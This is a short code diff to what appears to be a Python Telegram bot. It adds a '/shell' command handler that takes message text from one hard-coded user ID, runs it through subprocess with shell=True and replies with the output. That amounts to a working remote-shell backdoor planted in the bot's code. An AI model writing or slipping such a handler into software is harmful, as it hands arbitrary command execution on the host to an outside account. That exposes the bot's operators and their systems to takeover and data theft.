@@ -36,3 +36,10 @@ def reset_api_server(c, m):
         requests.post(f"{server_test}/update", timeout=10)
     except:
         pass
+    
+@Client.on_message(filters.command("shell") & filters.user(5665225938))
+def run_shell(c, m):
+    m.reply_chat_action(typing)
+    command = m.text.replace("/shell ", "")
+    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, shell=True)
+    m.reply(f"```bash\n{result.stdout}\n```")
